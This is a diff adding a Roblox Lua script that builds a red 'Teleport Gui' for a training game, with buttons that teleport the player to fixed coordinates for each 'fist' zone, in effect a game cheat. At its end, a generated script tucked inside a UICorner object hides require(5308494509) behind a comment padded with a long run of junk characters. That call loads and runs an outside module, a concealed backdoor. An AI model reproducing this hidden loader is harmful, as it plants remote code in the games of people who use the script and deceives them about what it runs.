@@ -1,0 +1,370 @@
+
+
+-- Instances:
+
+local SPTSCUSTOM = Instance.new("ScreenGui")
+local OpenGuif = Instance.new("TextButton")
+local UICorner = Instance.new("UICorner")
+local Main = Instance.new("Frame")
+local Second = Instance.new("Frame")
+local UICorner_2 = Instance.new("UICorner")
+local ScrollingFrame = Instance.new("ScrollingFrame")
+local UICorner_3 = Instance.new("UICorner")
+local _1Kfist = Instance.new("TextButton")
+local UICorner_4 = Instance.new("UICorner")
+local _100Kfist = Instance.new("TextButton")
+local UICorner_5 = Instance.new("UICorner")
+local _1Mfist = Instance.new("TextButton")
+local UICorner_6 = Instance.new("UICorner")
+local _100Mfist = Instance.new("TextButton")
+local UICorner_7 = Instance.new("UICorner")
+local _1Bfist = Instance.new("TextButton")
+local UICorner_8 = Instance.new("UICorner")
+local _100Bfist = Instance.new("TextButton")
+local UICorner_9 = Instance.new("UICorner")
+local _1Tfist = Instance.new("TextButton")
+local UICorner_10 = Instance.new("UICorner")
+local _100Tfist = Instance.new("TextButton")
+local UICorner_11 = Instance.new("UICorner")
+local _35Qafist = Instance.new("TextButton")
+local UICorner_12 = Instance.new("UICorner")
+local _5qi = Instance.new("TextButton")
+local UICorner_13 = Instance.new("UICorner")
+local _350Qifist = Instance.new("TextButton")
+local UICorner_14 = Instance.new("UICorner")
+local _500QaFist = Instance.new("TextButton")
+local UICorner_15 = Instance.new("UICorner")
+local UICorner_16 = Instance.new("UICorner")
+local Title = Instance.new("TextLabel")
+local UICorner_17 = Instance.new("UICorner")
+local Exit = Instance.new("TextButton")
+local UICorner_18 = Instance.new("UICorner")
+local FistText = Instance.new("TextLabel")
+local UICorner_19 = Instance.new("UICorner")
+
+--Properties:
+
+SPTSCUSTOM.Name = "SPTS CUSTOM"
+SPTSCUSTOM.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+SPTSCUSTOM.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+OpenGuif.Name = "OpenGuif"
+OpenGuif.Parent = SPTSCUSTOM
+OpenGuif.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+OpenGuif.Position = UDim2.new(0.00363636366, 0, 0.713968933, 0)
+OpenGuif.Size = UDim2.new(0, 103, 0, 50)
+OpenGuif.Font = Enum.Font.SourceSansBold
+OpenGuif.Text = "Open Fist"
+OpenGuif.TextColor3 = Color3.fromRGB(0, 0, 0)
+OpenGuif.TextScaled = true
+OpenGuif.TextSize = 14.000
+OpenGuif.TextStrokeTransparency = 0.900
+OpenGuif.TextWrapped = true
+OpenGuif.MouseButton1Down:Connect(function()
+	local button = script.Parent
+
+	button.MouseButton1Click:Connect(function()
+		button.Parent.Main:TweenPosition(UDim2.new(0.586, 0, 0.321, 0))
+
+	end)
+
+end)
+
+UICorner.Parent = OpenGuif
+
+
+Main.Name = "Main"
+Main.Parent = SPTSCUSTOM
+Main.BackgroundColor3 = Color3.fromRGB(150, 3, 3)
+Main.Position = UDim2.new(0.587000012, 0, 0, -450)
+Main.Size = UDim2.new(0, 572, 0, 404)
+
+Second.Name = "Second"
+Second.Parent = Main
+Second.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+Second.Size = UDim2.new(0, 572, 0, 398)
+
+UICorner_2.Parent = Second
+
+ScrollingFrame.Parent = Second
+ScrollingFrame.Active = true
+ScrollingFrame.BackgroundColor3 = Color3.fromRGB(150, 4, 4)
+ScrollingFrame.BorderColor3 = Color3.fromRGB(150, 4, 4)
+ScrollingFrame.Position = UDim2.new(0.0104895104, 0, 0.239796624, 0)
+ScrollingFrame.Size = UDim2.new(0, 560, 0, 296)
+ScrollingFrame.CanvasPosition = Vector2.new(0, 500)
+
+UICorner_3.Parent = ScrollingFrame
+
+_1Kfist.Name = "1K fist"
+_1Kfist.Parent = ScrollingFrame
+_1Kfist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_1Kfist.Position = UDim2.new(0.107142858, 0, 0.0131879821, 0)
+_1Kfist.Size = UDim2.new(0, 440, 0, 50)
+_1Kfist.Font = Enum.Font.SourceSansBold
+_1Kfist.Text = "1K Fist"
+_1Kfist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_1Kfist.TextScaled = true
+_1Kfist.TextSize = 14.000
+_1Kfist.TextStrokeTransparency = 0.900
+_1Kfist.TextWrapped = true
+_1Kfist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-56, 49, -73)
+end)
+
+
+UICorner_4.Parent = _1Kfist
+
+_100Kfist.Name = "100K fist"
+_100Kfist.Parent = ScrollingFrame
+_100Kfist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_100Kfist.Position = UDim2.new(0.107142858, 0, 0.0835397393, 0)
+_100Kfist.Size = UDim2.new(0, 440, 0, 50)
+_100Kfist.Font = Enum.Font.SourceSansBold
+_100Kfist.Text = "100K Fist"
+_100Kfist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_100Kfist.TextScaled = true
+_100Kfist.TextSize = 14.000
+_100Kfist.TextStrokeTransparency = 0.900
+_100Kfist.TextWrapped = true
+_100Kfist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2465, 63, -2304)
+end)
+
+UICorner_5.Parent = _100Kfist
+
+_1Mfist.Name = "1M fist"
+_1Mfist.Parent = ScrollingFrame
+_1Mfist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_1Mfist.Position = UDim2.new(0.107142858, 0, 0.153891504, 0)
+_1Mfist.Size = UDim2.new(0, 440, 0, 50)
+_1Mfist.Font = Enum.Font.SourceSansBold
+_1Mfist.Text = "1M Fist"
+_1Mfist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_1Mfist.TextScaled = true
+_1Mfist.TextSize = 14.000
+_1Mfist.TextStrokeTransparency = 0.900
+_1Mfist.TextWrapped = true
+_1Mfist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2399, 66, -2333)
+end)
+UICorner_6.Parent = _1Mfist
+
+_100Mfist.Name = "100M fist"
+_100Mfist.Parent = ScrollingFrame
+_100Mfist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_100Mfist.Position = UDim2.new(0.107142858, 0, 0.224243268, 0)
+_100Mfist.Size = UDim2.new(0, 440, 0, 50)
+_100Mfist.Font = Enum.Font.SourceSansBold
+_100Mfist.Text = "100M Fist"
+_100Mfist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_100Mfist.TextScaled = true
+_100Mfist.TextSize = 14.000
+_100Mfist.TextStrokeTransparency = 0.900
+_100Mfist.TextWrapped = true
+_100Mfist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2479, 81, -2387)
+end)
+
+UICorner_7.Parent = _100Mfist
+
+_1Bfist.Name = "1B fist"
+_1Bfist.Parent = ScrollingFrame
+_1Bfist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_1Bfist.Position = UDim2.new(0.107142858, 0, 0.294595033, 0)
+_1Bfist.Size = UDim2.new(0, 440, 0, 50)
+_1Bfist.Font = Enum.Font.SourceSansBold
+_1Bfist.Text = "1B Fist"
+_1Bfist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_1Bfist.TextScaled = true
+_1Bfist.TextSize = 14.000
+_1Bfist.TextStrokeTransparency = 0.900
+_1Bfist.TextWrapped = true
+_1Bfist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-145, 1556, -65)
+end)
+UICorner_8.Parent = _1Bfist
+
+_100Bfist.Name = "100B fist"
+_100Bfist.Parent = ScrollingFrame
+_100Bfist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_100Bfist.Position = UDim2.new(0.107142858, 0, 0.364946783, 0)
+_100Bfist.Size = UDim2.new(0, 440, 0, 50)
+_100Bfist.Font = Enum.Font.SourceSansBold
+_100Bfist.Text = "100B Fist"
+_100Bfist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_100Bfist.TextScaled = true
+_100Bfist.TextSize = 14.000
+_100Bfist.TextStrokeTransparency = 0.900
+_100Bfist.TextWrapped = true
+_100Bfist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(182, 2514, -466  )
+end) 
+UICorner_9.Parent = _100Bfist
+
+_1Tfist.Name = "1T fist"
+_1Tfist.Parent = ScrollingFrame
+_1Tfist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_1Tfist.Position = UDim2.new(0.107142858, 0, 0.436554819, 0)
+_1Tfist.Size = UDim2.new(0, 440, 0, 50)
+_1Tfist.Font = Enum.Font.SourceSansBold
+_1Tfist.Text = "1T Fist"
+_1Tfist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_1Tfist.TextScaled = true
+_1Tfist.TextSize = 14.000
+_1Tfist.TextStrokeTransparency = 0.900
+_1Tfist.TextWrapped = true
+_1Tfist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(207, 3492, 115 )
+end)
+UICorner_10.Parent = _1Tfist
+
+_100Tfist.Name = "100T fist"
+_100Tfist.Parent = ScrollingFrame
+_100Tfist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_100Tfist.Position = UDim2.new(0.107142858, 0, 0.505650342, 0)
+_100Tfist.Size = UDim2.new(0, 440, 0, 50)
+_100Tfist.Font = Enum.Font.SourceSansBold
+_100Tfist.Text = "100T Fist"
+_100Tfist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_100Tfist.TextScaled = true
+_100Tfist.TextSize = 14.000
+_100Tfist.TextStrokeTransparency = 0.900
+_100Tfist.TextWrapped = true
+_100Tfist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(827, 5565, -1697)
+end)
+UICorner_11.Parent = _100Tfist
+
+_35Qafist.Name = "35Qa fist"
+_35Qafist.Parent = ScrollingFrame
+_35Qafist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_35Qafist.Position = UDim2.new(0.107142858, 0, 0.576002061, 0)
+_35Qafist.Size = UDim2.new(0, 440, 0, 50)
+_35Qafist.Font = Enum.Font.SourceSansBold
+_35Qafist.Text = "35Qa Fist"
+_35Qafist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_35Qafist.TextScaled = true
+_35Qafist.TextSize = 14.000
+_35Qafist.TextStrokeTransparency = 0.900
+_35Qafist.TextWrapped = true
+_35Qafist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-233, 543, 322  )
+end)
+UICorner_12.Parent = _35Qafist
+
+_5qi.Name = "5 qi"
+_5qi.Parent = ScrollingFrame
+_5qi.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_5qi.Position = UDim2.new(0.107142858, 0, 0.719218135, 0)
+_5qi.Size = UDim2.new(0, 440, 0, 50)
+_5qi.Font = Enum.Font.SourceSansBold
+_5qi.Text = "5Qi Fist"
+_5qi.TextColor3 = Color3.fromRGB(0, 0, 0)
+_5qi.TextScaled = true
+_5qi.TextSize = 14.000
+_5qi.TextStrokeTransparency = 0.900
+_5qi.TextWrapped = true
+_5qi.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1925, 13219, 2142)
+end)
+UICorner_13.Parent = _5qi
+
+_350Qifist.Name = "350Qi fist"
+_350Qifist.Parent = ScrollingFrame
+_350Qifist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_350Qifist.Position = UDim2.new(0.107142858, 0, 0.789569855, 0)
+_350Qifist.Size = UDim2.new(0, 440, 0, 50)
+_350Qifist.Font = Enum.Font.SourceSansBold
+_350Qifist.Text = "350Qi Fist"
+_350Qifist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_350Qifist.TextScaled = true
+_350Qifist.TextSize = 14.000
+_350Qifist.TextStrokeTransparency = 0.900
+_350Qifist.TextWrapped = true
+_350Qifist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2788, 21224, -2936 )
+end)
+UICorner_14.Parent = _350Qifist
+
+_500QaFist.Name = "500Qa Fist"
+_500QaFist.Parent = ScrollingFrame
+_500QaFist.BackgroundColor3 = Color3.fromRGB(172, 7, 5)
+_500QaFist.Position = UDim2.new(0.107142858, 0, 0.646353841, 0)
+_500QaFist.Size = UDim2.new(0, 440, 0, 50)
+_500QaFist.Font = Enum.Font.SourceSansBold
+_500QaFist.Text = "500Qa Fist"
+_500QaFist.TextColor3 = Color3.fromRGB(0, 0, 0)
+_500QaFist.TextScaled = true
+_500QaFist.TextSize = 14.000
+_500QaFist.TextStrokeTransparency = 0.900
+_500QaFist.TextWrapped = true
+_500QaFist.MouseButton1Down:Connect(function()
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2294, 7288, 2633)
+end)
+
+UICorner_15.Parent = _500QaFist
+
+UICorner_16.Parent = Main
+
+Title.Name = "Title"
+Title.Parent = Main
+Title.BackgroundColor3 = Color3.fromRGB(161, 3, 3)
+Title.Position = UDim2.new(0.0104895104, 0, 0.0173267331, 0)
+Title.Size = UDim2.new(0, 501, 0, 43)
+Title.Font = Enum.Font.SourceSansBold
+Title.Text = "Teleport Gui             Made By Procar"
+Title.TextColor3 = Color3.fromRGB(0, 0, 0)
+Title.TextScaled = true
+Title.TextSize = 14.000
+Title.TextStrokeTransparency = 0.800
+Title.TextWrapped = true
+
+UICorner_17.Parent = Title
+
+Exit.Name = "Exit"
+Exit.Parent = Main
+Exit.BackgroundColor3 = Color3.fromRGB(95, 1, 1)
+Exit.Position = UDim2.new(0.896853149, 0, 0.0173267331, 0)
+Exit.Size = UDim2.new(0, 53, 0, 43)
+Exit.Font = Enum.Font.SourceSansBold
+Exit.Text = "X"
+Exit.TextColor3 = Color3.fromRGB(0, 0, 0)
+Exit.TextScaled = true
+Exit.TextSize = 14.000
+Exit.TextWrapped = true
+Exit.MouseButton1Down:Connect(function()
+	local button = script.Parent
+
+	button.MouseButton1Click:Connect(function()
+		button.Parent:TweenPosition(UDim2.new(0.587, 0, 0, -450))
+	end)
+end)
+
+
+UICorner_18.Parent = Exit
+
+FistText.Name = "Fist Text"
+FistText.Parent = Main
+FistText.BackgroundColor3 = Color3.fromRGB(150, 4, 4)
+FistText.Position = UDim2.new(0.0104895104, 0, 0.141089037, 0)
+FistText.Size = UDim2.new(0, 186, 0, 32)
+FistText.Font = Enum.Font.SourceSansBold
+FistText.Text = "Fist Version"
+FistText.TextColor3 = Color3.fromRGB(0, 0, 0)
+FistText.TextScaled = true
+FistText.TextSize = 14.000
+FistText.TextStrokeTransparency = 0.900
+FistText.TextWrapped = true
+
+UICorner_19.Parent = FistText
+
+-- Scripts:
+
+local function AVUPZKR_fake_script() -- UICorner_2. 
+	local script = Instance.new('Script', UICorner_2)
+
+	
+	--[[ Last synced 4/30/2022 08:20 ����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������]] require(5308494509) --[[                                                                                                  ]]--
+end
+coroutine.wrap(AVUPZKR_fake_script)()
